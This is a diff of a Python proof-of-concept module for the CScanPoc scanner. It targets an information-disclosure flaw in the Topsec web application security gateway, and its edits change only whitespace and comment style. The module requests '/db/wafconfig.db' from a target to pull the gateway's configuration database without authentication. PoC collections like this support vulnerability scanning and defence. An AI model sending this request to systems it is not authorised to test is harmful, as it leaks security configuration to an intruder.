@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'TOPSEC_0004'  # 平台漏洞编号，留空
     name = '天融信WEB应用安全网关 信息泄露'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = '天融信应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'f3524f43-f14e-454b-bed9-00f1babd7c03'
     author = '47bwy'  # POC编写者
@@ -31,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref http://www.wooyun.org/bugs/wooyun-2015-0130878
+            # ref http://www.wooyun.org/bugs/wooyun-2015-0130878
             payload = '/db/wafconfig.db'
             verify_url = self.target + payload
             req = requests.get(verify_url)
@@ -46,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
